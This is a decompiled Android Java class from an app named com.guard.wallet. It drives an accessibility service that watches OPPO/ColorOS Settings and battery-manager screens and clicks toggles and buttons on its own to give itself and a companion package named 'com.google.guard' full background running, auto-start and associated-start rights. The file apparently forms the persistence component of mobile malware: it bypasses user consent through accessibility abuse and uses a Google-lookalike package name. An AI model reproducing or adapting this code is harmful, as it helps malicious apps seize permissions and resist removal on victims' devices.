package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;
import p002e.C0262b;
import p005h.C0318e;
import p014r.EnumC0892e;

/* renamed from: o.v */
/* loaded from: classes.dex */
public final class C0433v extends AbstractC0414c {

    /* renamed from: v */
    public static final /* synthetic */ int f964v = 0;

    /* renamed from: r */
    public final AtomicReference f965r;

    /* renamed from: s */
    public final AtomicBoolean f966s;

    /* renamed from: t */
    public final AtomicBoolean f967t;

    /* renamed from: u */
    public final AtomicBoolean f968u;

    public C0433v() {
        super(w0(), "com.android.settings");
        this.f965r = new AtomicReference(EnumC0892e.KEEP_ALIVE_UNKNOWN);
        this.f966s = new AtomicBoolean(false);
        this.f967t = new AtomicBoolean(false);
        this.f968u = new AtomicBoolean(false);
        try {
            this.f852p.schedule(new RunnableC0432u(this, 4), 100L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
        }
    }

    public static ListenWindow A0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.applications.InstalledAppDetailsTop");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static CombineFilter B0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COLORS_SETTINGS_POWER_MANAGE_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("COLORS_SETTINGS_POWER_MANAGE_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter C0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COLORS_SETTINGS_POWER_MANAGE_2_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("COLORS_SETTINGS_POWER_MANAGE_2_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter b0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter c0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter d0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("COLORS_SETTINGS_ALLOW_BUTTON_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter e0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter f0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow g0() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.battery", "androidx.appcompat.app.b");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(d0());
        return listenWindow;
    }

    public static ListenWindow h0() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.battery", null);
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(d0());
        return listenWindow;
    }

    public static CombineFilter i0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COLORS_APP_IN_BACKGROUND_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow n0() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.battery", "com.coui.appcompat.dialog.app.a");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(d0());
        return listenWindow;
    }

    public static ListenWindow o0() {
        ListenWindow listenWindow = new ListenWindow("com.coloros.oppoguardelf", null);
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(d0());
        return listenWindow;
    }

    public static ListenWindow p0() {
        ListenWindow listenWindow = new ListenWindow("com.coloros.oppoguardelf", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(i0());
        return listenWindow;
    }

    public static ListenWindow q0() {
        ListenWindow listenWindow = new ListenWindow("com.coloros.oppoguardelf", "com.coloros.powermanager.fuelgaue.PowerControlActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow v0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        return listenWindow;
    }

    public static LinkedList w0() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(AbstractC0414c.m1035J());
        linkedList.add(A0(AbstractC0251g.x0()));
        linkedList.add(A0(AbstractC0251g.m658e()));
        linkedList.add(v0(AbstractC0251g.x0()));
        linkedList.add(v0(AbstractC0251g.m658e()));
        linkedList.add(y0());
        linkedList.add(q0());
        linkedList.add(g0());
        linkedList.add(n0());
        linkedList.add(h0());
        linkedList.add(o0());
        linkedList.add(z0());
        return linkedList;
    }

    public static ListenWindow x0() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.battery", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(i0());
        return listenWindow;
    }

    public static ListenWindow y0() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.battery", "com.oplus.powermanager.fuelgaue.PowerControlActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow z0() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.battery", "com.oplus.startupapp.view.StartupAppListActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public final void D0(String str) {
        try {
            PowerControlStateVO m707k = AbstractC0252h.m707k(str);
            m707k.setPackageName(str);
            AtomicBoolean atomicBoolean = this.f966s;
            if (atomicBoolean.get()) {
                m707k.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean.get()));
            }
            AtomicBoolean atomicBoolean2 = this.f967t;
            if (atomicBoolean2.get()) {
                m707k.setAllowAutoStart(Boolean.valueOf(atomicBoolean2.get()));
            }
            AtomicBoolean atomicBoolean3 = this.f968u;
            if (atomicBoolean3.get()) {
                m707k.setAllowRelateStart(Boolean.valueOf(atomicBoolean3.get()));
            }
            m707k.setRetryCount(m707k.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k);
            Log.d("o.v", str.concat(" 进程保活策略已保存"));
            str.concat(" 进程保活策略已保存");
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
        }
    }

    @Override // p012o.AbstractC0414c
    /* renamed from: Z */
    public final void mo1051Z() {
        ReentrantLock reentrantLock = this.f851o;
        if (reentrantLock.tryLock()) {
            try {
                if (!m1049T()) {
                    Log.d("o.v", "准备结束本地保活自动化引擎");
                    AbstractC0184g.m354h(100);
                    m1050X();
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m543x();
                    }
                    AtomicReference atomicReference = this.f965r;
                    if (Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP)) {
                        D0(MainApplication.getAppContext().getPackageName());
                    }
                    if (Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_BACKUP_APP)) {
                        D0("com.google.guard");
                    }
                    this.f852p.shutdownNow();
                    AbstractC0243l.m591a(this.f864c);
                    this.f850n.clear();
                    if (AbstractC0026q.m162M()) {
                        AbstractC0251g.T0(5);
                    }
                    if (C0318e.m844S().m860U() || !Objects.equals(0, AbstractC0248d.m609g())) {
                        C0262b.m738d();
                        AbstractC0184g.m349c();
                    } else {
                        MainApplication.getInstance().offerStrategyEvent("PREPARE_LEAVE_PIP");
                    }
                    Log.d("o.v", "已结束本地保活自动化引擎");
                    AbstractC0414c.m1044W();
                    mo1001d();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.v", e2);
            }
            reentrantLock.unlock();
        }
    }

    public final boolean j0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(g0());
            linkedList.add(n0());
            linkedList.add(h0());
            linkedList.add(o0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.v", "已进入是否完全允许对话框");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
            return false;
        }
    }

    public final boolean k0() {
        try {
            String x02 = Objects.equals(this.f965r.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP) ? AbstractC0251g.x0() : AbstractC0251g.m658e();
            LinkedList linkedList = new LinkedList();
            linkedList.add(A0(x02));
            linkedList.add(v0(x02));
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.v", "已进入App详情窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
            return false;
        }
    }

    public final boolean l0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(y0());
            linkedList.add(x0());
            linkedList.add(q0());
            linkedList.add(p0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.v", "已进入App耗电管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
            return false;
        }
    }

    public final boolean m0() {
        try {
            if (!m1078q(Collections.singletonList(z0()))) {
                return false;
            }
            Log.d("o.v", "已进入自启动管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
            return false;
        }
    }

    public final boolean r0() {
        UiObject findOneByCombineWithChild;
        String str;
        try {
            findOneByCombineWithChild = m1072k().findOneByCombineWithChild(new CombineFilterWithChild(AbstractC0414c.m1036K(), e0()));
            if (findOneByCombineWithChild == null) {
                findOneByCombineWithChild = m1072k().findOneByCombineWithChild(new CombineFilterWithChild(AbstractC0414c.m1036K(), b0()));
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
        }
        if (findOneByCombineWithChild != null) {
            Log.d("o.v", "完全允许后台行为栏目查找成功");
            CheckedResult m1048R = m1048R(findOneByCombineWithChild, 0);
            if (m1048R.isClicked()) {
                Log.d("o.v", "已点击完全允许后台行为");
            }
            if (m1048R.isChecked()) {
                Log.d("o.v", "已勾选完全允许后台行为");
                AbstractC0251g.T0(10);
                if (!j0()) {
                    this.f966s.set(true);
                    return true;
                }
                return false;
            }
            str = "未勾选完全允许后台行为";
        } else {
            str = "完全允许后台行为栏目查找失败";
        }
        Log.e("o.v", str);
        return false;
    }

    public final boolean s0() {
        try {
            UiObject findOneByCombineWithChild = m1072k().findOneByCombineWithChild(new CombineFilterWithChild(AbstractC0414c.m1036K(), c0()));
            if (findOneByCombineWithChild != null) {
                Log.d("o.v", "自启动栏目查找成功");
                CheckedResult m1048R = m1048R(findOneByCombineWithChild, 5);
                if (m1048R.isClicked()) {
                    Log.d("o.v", "已点击允许自启动");
                }
                boolean isChecked = m1048R.isChecked();
                AtomicBoolean atomicBoolean = this.f967t;
                if (isChecked) {
                    Log.d("o.v", "已勾选允许自启动");
                    atomicBoolean.set(true);
                    return true;
                }
                Log.e("o.v", "未勾选允许自启动");
                atomicBoolean.set(false);
            } else {
                Log.e("o.v", "允许自启动栏目查找失败");
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
        }
        return false;
    }

    public final boolean t0() {
        String str;
        try {
            UiObject findOneByCombineWithChild = m1072k().findOneByCombineWithChild(new CombineFilterWithChild(AbstractC0414c.m1036K(), f0()));
            if (findOneByCombineWithChild != null) {
                Log.d("o.v", "关联启动栏目查找成功");
                CheckedResult m1048R = m1048R(findOneByCombineWithChild, 5);
                if (m1048R.isClicked()) {
                    Log.d("o.v", "已点击允许关联启动");
                }
                if (m1048R.isChecked()) {
                    Log.d("o.v", "已勾选允许关联启动");
                    this.f968u.set(true);
                    return true;
                }
                str = "未勾选允许关联启动";
            } else {
                str = "关联启动栏目查找失败";
            }
            Log.e("o.v", str);
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
            return false;
        }
    }

    @Override // p012o.AbstractC0414c, p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        try {
            if (m1049T()) {
                return;
            }
            if (accessibilityEvent != null) {
                super.mo1002u(accessibilityEvent, str, str2);
            }
            boolean k02 = k0();
            String str3 = this.f864c;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
            if (k02) {
                concurrentLinkedQueue.remove("keepAliveInPowerControl");
                concurrentLinkedQueue.remove("keepAliveInAndroidXDialog");
                concurrentLinkedQueue.remove("keepAliveInStartup");
                if (!concurrentLinkedQueue.contains("keepAliveInAppDetail")) {
                    concurrentLinkedQueue.add("keepAliveInAppDetail");
                    AbstractC0243l.m593c(new RunnableC0432u(this, 0), str3);
                }
            }
            if (l0()) {
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAndroidXDialog");
                concurrentLinkedQueue.remove("keepAliveInStartup");
                if (!concurrentLinkedQueue.contains("keepAliveInPowerControl")) {
                    concurrentLinkedQueue.add("keepAliveInPowerControl");
                    AbstractC0243l.m593c(new RunnableC0432u(this, 1), str3);
                }
            }
            if (j0()) {
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInPowerControl");
                concurrentLinkedQueue.remove("keepAliveInStartup");
                if (!concurrentLinkedQueue.contains("keepAliveInAndroidXDialog")) {
                    concurrentLinkedQueue.add("keepAliveInAndroidXDialog");
                    AbstractC0243l.m593c(new RunnableC0432u(this, 2), str3);
                }
            }
            if (m0()) {
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInPowerControl");
                concurrentLinkedQueue.remove("keepAliveInAndroidXDialog");
                if (concurrentLinkedQueue.contains("keepAliveInStartup")) {
                    return;
                }
                concurrentLinkedQueue.add("keepAliveInStartup");
                AbstractC0243l.m593c(new RunnableC0432u(this, 3), str3);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
        }
    }

    public final void u0() {
        AtomicBoolean atomicBoolean = this.f966s;
        try {
            if (atomicBoolean.get()) {
                AtomicReference atomicReference = this.f965r;
                boolean equals = Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP);
                EnumC0892e enumC0892e = EnumC0892e.KEEP_ALIVE_BACKUP_APP;
                if (!equals) {
                    if (Objects.equals(atomicReference.get(), enumC0892e)) {
                        D0("com.google.guard");
                        mo1051Z();
                        return;
                    }
                    return;
                }
                D0(MainApplication.getAppContext().getPackageName());
                this.f850n.clear();
                atomicBoolean.set(false);
                this.f967t.set(false);
                this.f968u.set(false);
                if (AbstractC0252h.m714r("com.google.guard") || AbstractC0251g.d0("com.google.guard") == null) {
                    mo1051Z();
                    return;
                }
                atomicReference.set(enumC0892e);
                AbstractC0251g.Z0("com.google.guard");
                Log.d("o.v", "已启动 ".concat("com.google.guard").concat(" 应用详情"));
                "已启动 ".concat("com.google.guard").concat(" 应用详情");
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.v", e2);
        }
    }
}
